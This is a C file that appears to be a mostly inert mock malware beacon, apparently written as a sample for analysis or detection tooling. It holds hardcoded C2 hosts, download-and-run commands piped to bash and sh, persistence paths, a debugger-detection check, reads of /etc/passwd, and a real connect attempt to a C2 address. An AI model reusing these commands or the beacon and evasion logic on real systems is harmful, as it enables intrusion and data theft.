// ©AngelaMos | 2026
// suspicious_beacon.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

static const char *C2_ENDPOINTS[] = {
    "http://185.234.72.19:8443/gate.php",
    "http://91.215.85.142/api/v2/callback",
    "https://cdn-update.evil-domain.com/check",
};

static const char *PERSISTENCE_PATHS[] = {
    "/etc/cron.d/system-updater",
    "/home/.config/autostart/helper.desktop",
    "/usr/local/lib/libsystem_helper.so",
    "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
};

static const char *SUSPICIOUS_COMMANDS[] = {
    "/bin/sh -c wget -q -O - | sh",
    "curl -s http://185.234.72.19/payload | bash",
    "chmod +x /tmp/.cache_helper && /tmp/.cache_helper",
    "nohup /dev/shm/.x11_sess &",
    "iptables -A INPUT -p tcp --dport 4444 -j ACCEPT",
};

static const char *CRYPTO_WALLETS[] = {
    "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
    "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
};

static const char *ENCODED_PAYLOADS[] = {
    "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2FiY2RlZjEyMzQ=",
    "cG93ZXJzaGVsbCAtZW5jIFpXTm9ieUFpU0dWc2JHOG=",
};

static char xor_key = 0x41;

static void xor_decode(char *buf, size_t len) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= xor_key;
    }
}

static int try_connect(const char *addr, int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    inet_pton(AF_INET, addr, &sa.sin_addr);

    int ret = connect(fd, (struct sockaddr *)&sa, sizeof(sa));
    close(fd);
    return ret;
}

static void collect_sysinfo(char *buf, size_t buflen) {
    FILE *fp;

    fp = fopen("/etc/hostname", "r");
    if (fp) {
        fgets(buf, buflen, fp);
        fclose(fp);
    }

    fp = fopen("/etc/passwd", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {}
        fclose(fp);
    }

    fp = fopen("/proc/self/maps", "r");
    if (fp) {
        char line[512];
        while (fgets(line, sizeof(line), fp)) {}
        fclose(fp);
    }
}

static int detect_debugger(void) {
    FILE *fp = fopen("/proc/self/status", "r");
    if (!fp) return 0;

    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            int pid = atoi(line + 10);
            fclose(fp);
            return pid != 0;
        }
    }
    fclose(fp);
    return 0;
}

int main(void) {
    if (detect_debugger()) {
        puts("Nothing to see here.");
        return 0;
    }

    srand((unsigned)time(NULL));
    int endpoint_idx = rand() % 3;

    char sysinfo[256];
    memset(sysinfo, 0, sizeof(sysinfo));
    collect_sysinfo(sysinfo, sizeof(sysinfo));

    char encoded[] = "aHR0cHM6Ly9leGFtcGxlLmNvbS9jaGVjaw==";
    xor_decode(encoded, strlen(encoded));

    for (int attempt = 0; attempt < 5; attempt++) {
        printf("Beacon attempt %d to %s\n", attempt, C2_ENDPOINTS[endpoint_idx]);

        if (try_connect("185.234.72.19", 8443) == 0) {
            printf("Connected. Exfiltrating %zu bytes.\n", strlen(sysinfo));
            break;
        }

        unsigned int delay = 30 + (rand() % 60);
        printf("Sleeping %u seconds before retry...\n", delay);
        sleep(1);
    }

    return 0;
}
